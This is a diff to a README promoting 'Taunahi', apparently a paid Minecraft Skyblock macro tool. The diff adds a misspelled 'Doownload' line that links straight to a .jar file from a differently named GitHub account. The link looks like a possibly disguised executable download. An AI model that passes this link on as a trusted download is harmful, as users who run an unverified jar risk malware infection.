@@ -1,5 +1,5 @@
 # Taunahi - Next Generation Skyblock Scripts
-
+# Doownload: https://github.com/sskymacro/Taunahi-v3/releases/download/taunahiv3.5.17/Taunahi.v3.5.17.jar
 **Stop overpaying for bad scripts - get Taunahi.**
 ## GUI Showcase
 ![](https://cdn.discordapp.com/attachments/980212612153368607/1201110819115630652/ezgif-1-9fb60872ea.gif?ex=65c8a09e&is=65b62b9e&hm=f6906b2099dd30c8f31aa96b5b916ebd32c5fe4b3dee88135de46bc90d68f30a&)
